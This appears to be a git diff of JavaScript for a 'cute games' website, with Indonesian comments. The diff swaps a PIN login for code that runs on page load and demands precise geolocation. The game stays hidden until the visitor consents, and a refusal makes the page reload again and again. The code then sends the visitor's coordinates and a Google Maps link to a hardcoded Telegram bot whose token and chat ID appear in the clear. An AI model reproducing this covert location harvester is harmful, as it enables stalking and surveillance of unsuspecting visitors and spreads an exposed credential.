@@ -17,89 +17,82 @@ function createSparkles() {
     }, 500);
 }
 
-// Login functionality
-async function checkPin() {
-    const pin = document.getElementById('pinInput').value;
-    if (pin === '261103') {
-        // Send Telegram notification
-        await sendTelegramNotification();
-
-        // Show success and enter games
-        showNotification('Login berhasil! Selamat datang! 🌸', '#4CAF50');
-        setTimeout(() => {
-            document.getElementById('loginContainer').style.display = 'none';
-            document.getElementById('gameContainer').style.display = 'block';
-            createEmojiRain();
-        }, 1000);
-    } else {
-        showNotification('PIN salah! Coba lagi 😅', '#f44336');
-        document.getElementById('pinInput').value = '';
+// Fungsi utama untuk meminta akses lokasi dan mengelola tampilan
+function initializeLocationAccess() {
+    // Pastikan game container tersembunyi saat start
+    document.getElementById('gameContainer').style.display = 'none';
+    
+    if (!navigator.geolocation) {
+        alert('Browser Anda tidak mendukung geolocation. Silakan gunakan browser yang lebih modern.');
+        return;
     }
+
+    const options = {
+        enableHighAccuracy: true,
+        timeout: 15000,
+        maximumAge: 0
+    };
+
+    // Minta akses lokasi
+    navigator.geolocation.getCurrentPosition(
+        // Success callback
+        async (position) => {
+            console.log('Lokasi berhasil didapatkan');
+            
+            // Kirim notifikasi ke Telegram dengan lokasi
+            await sendTelegramNotification(position.coords);
+            
+            // Tampilkan game container
+            setTimeout(() => {
+                document.getElementById('gameContainer').style.display = 'block';
+            }, 500);
+        },
+        // Error callback
+        (error) => {
+            console.log('Error getting location:', error);
+            
+            let errorMessage = '';
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    errorMessage = 'Akses lokasi ditolak. Website akan restart untuk meminta akses kembali.';
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    errorMessage = 'Informasi lokasi tidak tersedia. Website akan restart.';
+                    break;
+                case error.TIMEOUT:
+                    errorMessage = 'Timeout mendapatkan lokasi. Website akan restart.';
+                    break;
+                default:
+                    errorMessage = 'Error tidak diketahui. Website akan restart.';
+                    break;
+            }
+            
+            alert(errorMessage);
+            
+            // Restart website setelah 2 detik
+            setTimeout(() => {
+                window.location.reload();
+            }, 2000);
+        },
+        options
+    );
 }
 
-// Fungsi untuk mendapatkan lokasi pengguna
-async function getCurrentLocation() {
-    return new Promise((resolve, reject) => {
-        if (!navigator.geolocation) {
-            reject(new Error('Geolocation tidak didukung oleh browser ini'));
-            return;
-        }
-
-        const options = {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 60000
-        };
-
-        navigator.geolocation.getCurrentPosition(
-            (position) => {
-                resolve({
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude,
-                    accuracy: position.coords.accuracy
-                });
-            },
-            (error) => {
-                let errorMessage = 'Tidak dapat mendapatkan lokasi: ';
-                switch (error.code) {
-                    case error.PERMISSION_DENIED:
-                        errorMessage += 'Akses lokasi ditolak';
-                        break;
-                    case error.POSITION_UNAVAILABLE:
-                        errorMessage += 'Informasi lokasi tidak tersedia';
-                        break;
-                    case error.TIMEOUT:
-                        errorMessage += 'Timeout mendapatkan lokasi';
-                        break;
-                    default:
-                        errorMessage += 'Error tidak diketahui';
-                        break;
-                }
-                reject(new Error(errorMessage));
-            },
-            options
-        );
-    });
-}
-
-// Fungsi yang sudah diupdate untuk mengirim notifikasi dengan lokasi
-async function sendTelegramNotification() {
+// Fungsi untuk mengirim notifikasi ke Telegram dengan lokasi
+async function sendTelegramNotification(coords) {
     const token = '7637763679:AAGO9TEEgWqkzllClcKySyLdY6fHujBmP7U';
     const chatId = '6678271110';
-
+    
     try {
-        // Dapatkan lokasi terlebih dahulu
-        const location = await getCurrentLocation();
-
         // Pesan dengan informasi lokasi
-        const message = `🌸 Seseorang berhasil login ke website cute games! 🎮✨
+        const message = `🌸 Seseorang mengakses website cute games! 🎮✨
 
-📍 Lokasi Login:
-• Latitude: ${location.latitude}
-• Longitude: ${location.longitude}
-• Akurasi: ${Math.round(location.accuracy)} meter
+📍 Lokasi Akses:
+• Latitude: ${coords.latitude}
+• Longitude: ${coords.longitude}
+• Akurasi: ${Math.round(coords.accuracy)} meter
 
-🗺️ Google Maps: https://www.google.com/maps?q=${location.latitude},${location.longitude}
+🗺️ Google Maps: https://www.google.com/maps?q=${coords.latitude},${coords.longitude}
 
 ⏰ Waktu: ${new Date().toLocaleString('id-ID')}`;
 
@@ -116,7 +109,7 @@ async function sendTelegramNotification() {
             })
         });
 
-        // Kirim lokasi sebagai titik di peta (opsional)
+        // Kirim lokasi sebagai titik di peta
         await fetch(`https://api.telegram.org/bot${token}/sendLocation`, {
             method: 'POST',
             headers: {
@@ -124,51 +117,32 @@ async function sendTelegramNotification() {
             },
             body: JSON.stringify({
                 chat_id: chatId,
-                latitude: location.latitude,
-                longitude: location.longitude
+                latitude: coords.latitude,
+                longitude: coords.longitude
             })
         });
 
         console.log('Notifikasi dengan lokasi berhasil dikirim!');
-
+        
     } catch (error) {
-        console.log('Error mendapatkan lokasi:', error.message);
-
-        // Jika gagal mendapatkan lokasi, kirim pesan tanpa lokasi
-        const fallbackMessage = `🌸 Seseorang berhasil login ke website cute games! 🎮✨
-
-⚠️ Lokasi tidak dapat dideteksi: ${error.message}
-⏰ Waktu: ${new Date().toLocaleString('id-ID')}`;
-
-        try {
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: fallbackMessage
-                })
-            });
-            console.log('Notifikasi tanpa lokasi berhasil dikirim!');
-        } catch (telegramError) {
-            console.log('Telegram notification error:', telegramError);
-        }
+        console.log('Telegram notification error:', error);
     }
 }
 
-// Fungsi untuk meminta izin lokasi saat halaman dimuat (opsional)
-function requestLocationPermission() {
+// Jalankan saat halaman dimuat
+window.addEventListener('load', () => {
+    // Berikan sedikit delay untuk memastikan semua elemen sudah dimuat
+    setTimeout(() => {
+        initializeLocationAccess();
+    }, 500);
+});
+
+// Fungsi untuk debugging - bisa dihapus jika tidak diperlukan
+function checkLocationSupport() {
     if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            () => console.log('Izin lokasi diberikan'),
-            (error) => {
-                if (error.code === error.PERMISSION_DENIED) {
-                    console.log('Izin lokasi ditolak oleh pengguna');
-                }
-            }
-        );
+        console.log('Geolocation didukung');
+    } else {
+        console.log('Geolocation tidak didukung');
     }
 }
 
